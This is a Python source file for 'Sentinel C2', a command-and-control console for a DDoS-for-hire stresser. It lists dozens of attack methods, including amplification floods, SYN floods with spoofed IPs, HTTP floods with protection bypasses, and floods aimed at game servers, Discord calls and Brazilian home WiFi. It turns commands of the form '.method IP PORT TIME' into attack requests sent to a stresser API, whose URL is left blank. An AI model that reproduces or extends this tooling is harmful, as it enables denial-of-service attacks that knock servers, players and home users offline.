# sentinel c2 botnet for dreams stresser
# fuck operation poweroff

import os
import asyncio
import aiohttp
from colorama import Fore, init
import threading
import time 
import random
from datetime import datetime

os.system("mode con: cols=86 lines=21")

init(autoreset=True)

def show_methods():
    os.system("cls")
    os.system("mode con: cols=106 lines=57")

    methods = [
        (Fore.WHITE + "[ " + Fore.MAGENTA + "Layer 4 AMP Methods" + Fore.WHITE + " ]"),
        (Fore.WHITE + "  │ .amp-ssdp        " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Mixed Amplification SSDP Flood"),
        (Fore.WHITE + "  │ .amp-dns         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Mixed Amplification DNS Flood"),
        (Fore.WHITE + "  │ .amp-wsd         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Mixed Amplification with Web Services Discovery Flood"),
        (Fore.WHITE + "  │ .amp-mix         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Mixed Amplification with every method"),
        (Fore.WHITE + "  │ .amp-ldap        " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Mixed Amplification with Lightweight Directory Access Protocol Flood"),
        (Fore.WHITE + "[ " + Fore.MAGENTA + "Layer 4 UDP Methods" + Fore.WHITE + " ]"),
        (Fore.WHITE + "  │ .udp-kr          " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " UDP Flood for Korean Servers"),
        (Fore.WHITE + "  │ .udp-raw         " + Fore.WHITE + "[" + Fore.RED + "UNPROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sends Raw Packets with UDP protocol"),
        (Fore.WHITE + "  │ .udp-pps         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sends a large amount of UDP packets to the server"),
        (Fore.WHITE + "  │ .udp-raknet      " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Amplified UDP attack"),
        (Fore.WHITE + "[ " + Fore.MAGENTA + "Layer 4 TCP Methods" + Fore.WHITE + " ]"),
        (Fore.WHITE + "  │ .tcp-botnet      " + Fore.WHITE + "[" + Fore.RED + "UNPROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " TCP Flood with zombies"),
        (Fore.WHITE + "  │ .tcp-ack         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sending heavy ACK packets to TCP server"),
        (Fore.WHITE + "  │ .tcp-syn         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " SYN TCP attack Using Spoofed IP Addresses"),
        (Fore.WHITE + "  │ .tcp-tls         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sends a large number of TLS connection requests to the target server."),
        (Fore.WHITE + "  │ .tcp-mix         " + Fore.WHITE + "[" + Fore.RED + "UNPROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Mixed Transmission Control Protocol Attack"),
        (Fore.WHITE + "  │ .tcp-killer      " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sends TCP Packets That Are Too Heavy"),
        (Fore.WHITE + "  │ .tcp-bypass      " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " TCP Flood with Bypasses"),
        (Fore.WHITE + "  │ .tcp-burst       " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " TCP Flood With Special Things"),
        (Fore.WHITE + "[ " + Fore.MAGENTA + "Layer 4 OVH Methods" + Fore.WHITE + " ]"),
        (Fore.WHITE + "  │ .ovh-tcp         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sends TCP Packets to OVH Server"),
        (Fore.WHITE + "  │ .ovh-udp         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sends UDP Packets to OVH Server"),
        (Fore.WHITE + "  │ .ovh-amp         " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Sends AMP Packets to OVH Server"),
        (Fore.WHITE + "[ " + Fore.MAGENTA + "Layer 4 Geolocation Methods" + Fore.WHITE + " ]"),
        (Fore.WHITE + "  │ .amp-br          " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Amplification Flood for Brazilian Servers"),
        (Fore.WHITE + "  │ .amp-cn          " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Amplification Flood for Chinese Servers"),
        (Fore.WHITE + "  │ .amp-pk          " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Amplification Flood for Pakistani Servers"),
        (Fore.WHITE + "  │ .amp-vn          " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Amplification Flood for Vietnamese Servers"),
        (Fore.WHITE + "  │ .home-br         " + Fore.WHITE + "[" + Fore.RED + "UNPROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " DNS Flood for Brazilian Home WiFi"),
        (Fore.WHITE + "[ " + Fore.MAGENTA + "Layer 4 Game Methods" + Fore.WHITE + " ]"),
        (Fore.WHITE + "  │ .rainbow         " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " Rainbow Six Siege Server Flood"),
        (Fore.WHITE + "  │ .teamspeak       " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " TeamSpeak Call Flood"),
        (Fore.WHITE + "  │ .discord         " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " Discord Call Flood"),
        (Fore.WHITE + "  │ .pubg            " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " PUBG Server Flood"),
        (Fore.WHITE + "  │ .rust            " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " Rust Server Flood"),
        (Fore.WHITE + "  │ .fortnite        " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " Fortnite Server Flood"),
        (Fore.WHITE + "  │ .mta             " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " Multi Theft Auto Server Flood"),
        (Fore.WHITE + "  │ .samp            " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " San Andreas Multiplayer Server Flood"),
        (Fore.WHITE + "  │ .fivem           " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " Grand Theft Auto 5 Multiplayer"),
        (Fore.WHITE + "  │ .steam           " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" + Fore.WHITE + " Flood for Steam's Servers"),
        (Fore.WHITE + "  │ .cs16            " + Fore.WHITE + "[" + Fore.GREEN + "Gamer Servers" + Fore.WHITE + "]" +   Fore.WHITE + " Counter Strike 1.6 Flood"),
        (Fore.WHITE + "[ " + Fore.MAGENTA + "Layer 7 Methods" + Fore.WHITE + " ]"),
        (Fore.WHITE + "  │ .http-autobypass " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " HTTP Flood with strong bypass"),
        (Fore.WHITE + "  │ .http-bypass     " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " HTTP Flood with bypass"),
        (Fore.WHITE + "  │ .http-rape       " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " HTTP Flood with aggressive method"),
        (Fore.WHITE + "  │ .http-bigrs      " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " Simple HTTP Flood with Zombies"),
        (Fore.WHITE + "  │ .http-raw        " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " HTTP Flood with raw packets"),
        (Fore.WHITE + "  │ .http-sentinel   " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " HTTP Flood with aggressive method"),
        (Fore.WHITE + "  │ .korea1          " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " HTTP Flood for Korean Servers"),
        (Fore.WHITE + "  │ .korea2          " + Fore.WHITE + "[" + Fore.GREEN + "PROTECTED" + Fore.WHITE + "]" + Fore.WHITE + " HTTP Flood for Korean Servers"),
    ]

    for method in methods:
        print(method)

def help_menu():
    helpm = """
    methods - To See All Method's
    help - To See All Command's
    plan - To See User Expiry/plan
    credits - See credits
    exit - To Close Session
    """
    for line in helpm.strip().splitlines():
        line = line.strip()  
        if line: 
            print(line)
            time.sleep(0.1)

def gradient_text(text, start_color=(0, 0, 128), end_color=(128, 0, 128)):
    gradient_text = ""
    steps = len(text.splitlines())
    for i, line in enumerate(text.splitlines()):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / steps))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / steps))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / steps))
        gradient_text += f"\033[38;2;{r};{g};{b}m{line}\n"
    return gradient_text

from datetime import datetime

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


async def send_attack(ip, port, duration, method):
    # check readme.md
    url = f""

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            print(f"Response Status: {response.status}")  
            if response.status == 200:
                json_response = await response.json()
                if json_response.get("Status") == "Success":
                    clear_screen()
                    os.system("mode con: cols=86 lines=21")

                    attack_success_message = f"""
                          ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                          ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                          ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩   
                   ⚡ Smoking Them Is Easy The Choise Is Yours. ⚡       
             ╔═════════════════════════════════════════════════════════╗
                 TARGET:      [ {ip} ]
                 PORT:        [ {port} ]
                 TIME:        [ {duration} ]
                 METHOD:      [ {method} ]
             ╚═════════════════════════════════════════════════════════╝
             ╔═════════════════════════════════════════════════════════╗
                 VIP:         [ 𝓽𝓻𝓾𝓮 ]
                 CONCURRENTS: [ ?/5 ]
                 THREADS:     [ 56/509 ]
             ╚═════════════════════════════════════════════════════════╝
                    """
                    print(gradient_text(attack_success_message))
                else:
                    print("Failed to send attack")  
            else:
                print("Failed to send attack - Server error")  
command_map = {
    'amp-dns': 'AMP-DNS',
    'amp-ssdp': 'AMP-SSDP',
    'http-raw': 'HTTP-RAW',
    'http-autobypass': 'HTTP-AUTOBYPASS',
    'http-bypass': 'HTTP-BYPASS',
    'http-rape': 'HTTP-RAPE',
    'http-sentinel': 'HTTP-DREAMS',
    'http-bigrs': 'HTTP-BIGRS',
    'http-raw': 'HTTP-RAW',
    'korea1': 'KOREA1',
    'korea2': 'KOREA2',
    'amp-wsd': 'AMP-WSD',
    'amp-mix': 'AMP-MIX',
    'amp-ldap': 'AMP-LDAP',
    'udp-kr': 'UDP-KR',
    'udp-raw': 'UDP-RAW',
    'udp-pps': 'UDP-PPS',
    'udp-raknet': 'UDP-RAKNET',
    'tcp-botnet': 'TCP-BOTNET',
    'tcp-ack': 'TCP-ACK',
    'tcp-syn': 'TCP-SYN',
    'tcp-tls': 'TCP-TLS',
    'tcp-mix': 'TCP-MIX',
    'tcp-killer': 'TCP-KILLER',
    'tcp-bypass': 'TCP-BYPASS',
    'tcp-burst': 'TCP-BURST',
    'ovh-tcp': 'OVH-TCP',
    'ovh-udp': 'OVH-UDP',
    'ovh-amp': 'OVH-AMP',
    'rainbow': 'RAINBOW',
    'teamspeak': 'TEAMSPEAK',
    'discord': 'DISCORD',
    'pubg': 'PUBG',
    'rust': 'RUST',
    'fortnite': 'FORTNITE',
    'mta': 'MTA',
    'samp': 'SAMP',
    'fivem': 'FIVEM',
    'steam': 'STEAM',
    'cs16': 'CS16',
    'amp-br': 'AMP-BR',
    'amp-cn': 'AMP-CN',
    'amp-pk': 'AMP-PK',
    'amp-vn': 'AMP-VN',
    'tcp-cn': 'TCP-CN',
    'tcp-br': 'TCP-BR',
    'home-br': 'HOME-BR',
}

def main():
    os.system("title Sentinel C2 | Concurrents (0/5) | dsc.gg/wearentdevs")
    os.system("cls" if os.name == "nt" else "clear")
    ascii_art = """
                                ╔═╗╔═╗╔╗╔╔╦╗╦╔╗╔╔═╗╦  
                                ╚═╗║╣ ║║║ ║ ║║║║║╣ ║  
                                ╚═╝╚═╝╝╚╝ ╩ ╩╝╚╝╚═╝╩═╝
                   ══════╦══════════════════════════════════╦══════
                         ║                                  ║
                  ╔══════╩══════════════════════════════════╩══════╗
               ╔══╣            Welcome to Sentinel C2!             ╠══╗
               ║  ╚════════════════════════════════════════════════╝  ║
         ╔═════╩══════════════════════════════════════════════════════╩═════╗
         ║          Copyright © 2024 Sentinel All Rights Reserved           ║
         ╚══╦════════════════════════════════════════════════════════════╦══╝
      ╔═════╩════════════════════════════════════════════════════════════╩═════╗ 
      ║                  Type {help} for all the commands                      ║
      ╚════════════════════════════════════════════════════════════════════════╝
    """
    print(gradient_text(ascii_art))

    while True:
        try:
            print()
            command = input(Fore.MAGENTA + "╔═══" + Fore.MAGENTA + "[" + Fore.WHITE + "root" + Fore.MAGENTA + "@" + Fore.WHITE + "sentinel" + Fore.MAGENTA + "]" + Fore.MAGENTA + "\n╚══> " + Fore.WHITE)
            if command.lower() == "help":
                help_menu() 
            elif command.lower() == "plan":
                print("Your Plan: Premium VIP Diamond (It will expire in 612369132767312672317623167762138 days)")  
            elif command.lower() == "credits":
                print("\n- Made by: Sempiller\n - Credits to: octus\n > dsc.gg/wearentdevs\n")
            elif command.lower() == "clear":
                clear_screen()
                os.system("mode con: cols=86 lines=21")
                print(gradient_text(ascii_art))
            elif command.lower() == "methods":
                show_methods()
            elif command.lower() == "exit":
                print("Exiting...")
                break
            elif command.lower().startswith('.'):
                parts = command.lower().split()
                if len(parts) == 4:
                    method = command_map.get(parts[0][1:], None)
                    if method:
                        ip = parts[1]
                        port = int(parts[2])
                        duration = int(parts[3])
                        asyncio.run(send_attack(ip, port, duration, method))
                    else:
                        print("Unknown method.")
                else:
                    print("Invalid command format. Use: .method IP PORT TIME")
            else:
                print("Unknown command.")
        except KeyboardInterrupt:
            print("\nExiting...")
            break

if __name__ == '__main__':
    main()